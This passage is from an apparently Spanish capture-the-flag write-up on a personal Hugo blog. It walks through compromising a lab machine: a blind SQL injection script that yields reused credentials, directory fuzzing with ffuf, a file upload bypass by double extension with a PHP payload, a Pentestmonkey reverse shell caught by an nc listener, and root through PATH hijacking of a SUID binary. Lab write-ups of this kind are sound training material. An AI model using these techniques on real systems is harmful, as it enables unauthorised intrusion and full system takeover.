+</span></span><span style="display:flex;"><span>      print<span style="color:#ff7b72;font-weight:bold">(</span>payload<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>      <span style="color:#ff7b72">if</span> END &gt; 1:
+</span></span><span style="display:flex;"><span>         os.system<span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">&#34;clear&#34;</span><span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>         print<span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">&#34;El usuario y contraseña es: &#34;</span>,box<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>         sys.exit<span style="color:#ff7b72;font-weight:bold">()</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>      <span style="color:#ff7b72">if</span> not <span style="color:#a5d6ff">&#34;Wrong&#34;</span> in r.text:
+</span></span><span style="display:flex;"><span>         os.system<span style="color:#ff7b72;font-weight:bold">(</span><span style="color:#a5d6ff">&#34;clear&#34;</span><span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>         <span style="color:#79c0ff">box</span> <span style="color:#ff7b72;font-weight:bold">=</span> box + char
+</span></span><span style="display:flex;"><span>         print<span style="color:#ff7b72;font-weight:bold">(</span>box<span style="color:#ff7b72;font-weight:bold">)</span>
+</span></span><span style="display:flex;"><span>         <span style="color:#79c0ff">END</span> <span style="color:#ff7b72;font-weight:bold">=</span> <span style="color:#a5d6ff">0</span>
+</span></span><span style="display:flex;"><span>         break
+</span></span></code></pre></div><p>Utilizando el script obtenemos las siguientes credenciales: <code>admin:Th3s3usW4sK1ng</code></p>
+<h1 id="explotando-file-upload">
+  Explotando File Upload
+  <a class="heading-link" href="#explotando-file-upload">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Utilizando las credenciales obtenidas, nos podemos loguear en la página de <code>login</code></p>
+<img src="/images/Pasted image 20260130005105.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>y nos redirige hacia <code>upload.php</code>, donde podemos subir imágenes</p>
+<img src="/images/Pasted image 20260130005319.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Probando con una imagen cualquier <code>.jpeg</code>, vemos que dice que se ha subido exitosamente, pero no sabemos a qué directorio se sube</p>
+<img src="/images/Pasted image 20260130005608.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Por tanto vamos a realizar un fuzzeo, para encontrar el directorio que alberga las imágenes que subimos, para ello usaremos <code>FUFF</code>, de la siguiente manera</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -u http://10.129.7.48/images/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -fl <span style="color:#a5d6ff">60</span>
+</span></span></code></pre></div><p>y encontramos dos directorios <code>images</code>, y <code>assets</code></p>
+<img src="/images/Pasted image 20260130005708.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Ahora si realizamos otro fuzzeo en el directorio <code>/images</code>, de la siguiente forma</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ffuf -u http://10.129.7.48/images/FUZZ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -fs <span style="color:#a5d6ff">276</span>
+</span></span></code></pre></div><p>Encontramos el directorio <code>uploads</code></p>
+<img src="/images/Pasted image 20260130005929.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Ahora si vamos al directorio <code>/images/uploads/image.jpeg</code>, que es el foto que subimos previamente, encontramos que ahí se encuentra</p>
+<img src="/images/Pasted image 20260130010125.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Por tanto sabemos el directorio que alberga los archivos que estamos subiendo.</p>
+<p>Ahora si intentamos subir un archivo vacío, nos aparece el siguiente mensaje de error</p>
+<img src="/images/Pasted image 20260130010220.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Por tanto interceptaremos la petición con <code>burpsuite</code>, para ver cómo se tramita.</p>
+<p>Vemos que si la mandamos sin más, se sube correctamente</p>
+<img src="/images/Pasted image 20260130010330.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Pero si cambiamos el <code>filename</code>, a otro que no sea <code>JPG</code>, <code>JPEG</code> o <code>PNG</code>, da un mensaje de error.</p>
+<img src="/images/Pasted image 20260130010429.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Probaremos usar doble extensión, e insertaremos código <code>PHP</code> al final del todo, para verificar si se interpreta.</p>
+<p>para ello utilizaremos el siguiente código</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#ff7b72;font-weight:bold">&lt;?</span>php <span style="color:#ff7b72">if</span>(<span style="color:#a5d6ff">5</span><span style="color:#ff7b72;font-weight:bold">&gt;</span><span style="color:#a5d6ff">3</span>) <span style="color:#ff7b72">echo</span> <span style="color:#a5d6ff">&#34;Vulnerable&#34;</span>; <span style="color:#8b949e;font-weight:bold;font-style:italic">?&gt;</span><span style="color:#f85149">
+</span></span></span></code></pre></div><p>y en <code>filename</code>, pondremos <code>test.php.jpg</code></p>
+<p>de la siguiente forma</p>
+<img src="/images/Pasted image 20260130010728.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>y el código al final del todo</p>
+<img src="/images/Pasted image 20260130010741.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>y ahora vamos hacia <code>/images/uploads/test.php.jpg</code> y vemos que el código <code>PHP</code> fue interpretado, por tanto tenemos ejecución de código</p>
+<img src="/images/Pasted image 20260130010820.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Ahora podemos subir un archivo malicioso, que nos envíe una consola interactiva hacia un puerto en el que estaremos en escucha con <code>nc</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>nc -nlvp <span style="color:#a5d6ff">4443</span>
+</span></span></code></pre></div><p>y ejecutaremos el código de <code>Pentestmonkey</code> <a href="https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php"  class="external-link" target="_blank" rel="noopener">https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/refs/heads/master/php-reverse-shell.php</a></p>
+<p>Subimos el archivo <code>shell.php.jgp</code>, y ahora lo ejecutamos</p>
+<img src="/images/Pasted image 20260130011120.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>y conseguimos la consola interactiva en nuestro terminal</p>
+<img src="/images/Pasted image 20260130011149.png" style="width:100%; height:auto; display:block; margin:auto;">
+<h1 id="movimiento-lateral">
+  Movimiento lateral
+  <a class="heading-link" href="#movimiento-lateral">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h1>
+<p>Si nos vamos al directorio <code>/home</code>, encontramos que existe el usuario <code>theseus</code>.</p>
+<p>Además si vemos el <code>/etc/passwd</code>, y buscamos por los usuarios que usen <code>bash</code>, vemos que aparece solamente <code>root</code> y <code>theseus</code></p>
+<img src="/images/Pasted image 20260130011332.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Como obtuvimos la contraseña de <code>admin</code>, en el dumpeo de la base de datos, probaremos si es que se reutiliza la contraseña, probamos con <code>theseus:Th3s3usW4sK1ng</code></p>
+<p>Y vemos que migramos de usuario exitosamente</p>
+<img src="/images/Pasted image 20260130011511.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Ahora con el nuevo usuario podemos leer la <code>user.txt</code></p>
+<img src="/images/Pasted image 20260130011556.png" style="width:100%; height:auto; display:block; margin:auto;">
+# Escalando privilegios
+<p>Para escalar privilegios buscamos por archivos con permisos SUID</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>find / -perm -4000 2&gt;/dev/null
+</span></span></code></pre></div><p>y encontramos el binario <code>sysinfo</code>, que no es usual</p>
+<img src="/images/Pasted image 20260130011831.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Al correrlo nos muestra mucho output, pero no da opción a nada</p>
+<img src="/images/Pasted image 20260130011926.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Le hacemos un <code>strings</code>, para ver los caracteres legibles, en búsqueda de comprender mejor el binario</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>strings /bin/sysinfo
+</span></span></code></pre></div><h2 id="explotando-pathhijacking">
+  Explotando PathHijacking
+  <a class="heading-link" href="#explotando-pathhijacking">
+    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
+    <span class="sr-only">Link to heading</span>
+  </a>
+</h2>
+<p>y encontramos las siguientes líneas interesantes</p>
+<img src="/images/Pasted image 20260130012043.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Vemos que utiliza <code>lshw</code>, <code>fdisk</code> y <code>cat</code>, sin proporcionar la ruta absoluta, por tanto es vulnerable a #PathHijacking</p>
+<p>Nos dirigiremos al directorio <code>/tmp</code>, y ahí crearemos el archivo <code>lshw</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>touch lshw
+</span></span></code></pre></div><p>y posteriormente agregaremos el contenido para cambiar <code>/bin/bash</code> a suid</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#a5d6ff">&#34;chmod u+s /bin/bash&#34;</span> &gt;&gt; /tmp/lshw
+</span></span></code></pre></div><img src="/images/Pasted image 20260130012615.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Le damos permisos de ejecución para todos los usuarios</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>chmod +x /tmp/lshw
+</span></span></code></pre></div><p>y cambiamos el <code>PATH</code>, de la siguiente forma</p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>export <span style="color:#79c0ff">PATH</span><span style="color:#ff7b72;font-weight:bold">=</span>/tmp:<span style="color:#79c0ff">$PATH</span>
+</span></span></code></pre></div><p>Ahora volvemos a correr el binario <code>/bin/sysinfo</code></p>
+<p>y si vemos si ha cambiado <code>/bin/bash</code>, tenemos que ahora es <code>SUID</code></p>
+<img src="/images/Pasted image 20260130013110.png" style="width:100%; height:auto; display:block; margin:auto;">
+<p>Por tanto ahora podemos hacer el siguiente comando para tener privilegios de <code>root</code></p>
+<div class="highlight"><pre tabindex="0" style="color:#e6edf3;background-color:#0d1117;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>bash -p
+</span></span></code></pre></div><p>y tenemos privilegios máximos en el sistema, permitiéndonos poder leer la <code>root.txt</code> y comprometer totalmente la máquina víctima.</p>
+<img src="/images/Pasted image 20260130013215.png" style="width:100%; height:auto; display:block; margin:auto;">
+
+      </div>
+
+
+      <footer>
+        
+
+
+        
+        
+        
+        
+        
+        
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+    </div>
+
+    <footer class="footer">
+  <section class="container">
+    ©
+    
+      2019 -
+    
+    2026
+     CeleroRKX 
+    ·
+    
+    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
+    
+  </section>
+</footer>
+
+  </main>
+
+  
+
+  
+  
+  <script src="/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
+  
+
+  
+
+  
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+</body>
+</html>
